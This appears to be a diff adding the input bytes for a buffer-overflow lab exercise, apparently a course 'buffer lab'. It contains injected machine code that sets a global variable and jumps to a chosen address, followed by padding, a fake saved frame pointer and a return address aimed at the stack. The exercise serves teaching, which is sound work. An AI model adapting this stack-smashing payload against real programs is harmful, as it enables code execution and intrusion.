@@ -1,0 +1,13 @@
+c7 05 04 d1 04 08 96 	/* movl   $0x2036e096,0x804d104 */
+e0 36 20 
+68 7d 8c 04 08       	/* push   $0x8048c7d */
+c3                   	/* ret */ 
+00 00 00 00 /* filler */
+00 00 00 00
+00 00 00 00
+00 00 00 00
+BB BB BB BB /* integer in test */
+DD DD DD DD /* integer in test */
+AA AA AA AA /* old ebp for test */
+B8 2E 68 55 /* address of the beginnign of the stack */
+
